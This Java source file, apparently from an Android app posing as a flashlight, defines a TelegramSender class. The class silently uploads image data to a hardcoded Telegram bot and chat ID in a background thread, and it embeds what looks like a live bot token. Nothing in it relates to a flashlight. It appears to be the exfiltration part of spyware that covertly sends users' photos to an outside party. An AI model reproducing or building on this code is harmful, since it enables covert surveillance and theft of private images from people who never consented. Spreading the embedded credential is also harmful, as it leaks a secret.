package com.flashlight.app;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramSender {
    private static final String BOT_TOKEN = "8241864563:AAHWFBXYzw4YsVuMMylIrQbPm280iyEQyvM";
    private static final String CHAT_ID = "6489746690";

    public void send(byte[] data, String filename) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                
                c.setConnectTimeout(15000);
                c.setReadTimeout(15000);

                c.setDoOutput(true);
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                OutputStream os = c.getOutputStream();
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n").getBytes());
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"" + filename + "\"\r\n").getBytes());
                os.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
                os.write(data);
                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                os.flush(); os.close();

                int code = c.getResponseCode();
                android.util.Log.d("TG_SENDER", "Response code: " + code);
            } catch (Exception e) { 
                android.util.Log.e("TG_SENDER", "Error: " + e.getMessage());
            }
        }).start();
    }
}
